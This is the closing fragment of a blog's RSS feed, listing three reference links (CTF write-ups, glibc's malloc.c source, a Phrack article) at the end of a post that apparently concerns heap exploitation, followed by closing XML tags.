<li><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016</a></li>
<li><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></li>
<li><a href="http://www.phrack.org/issues/66/10.html" target="_blank" rel="external">http://www.phrack.org/issues/66/10.html</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2018/01/16/0x41/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
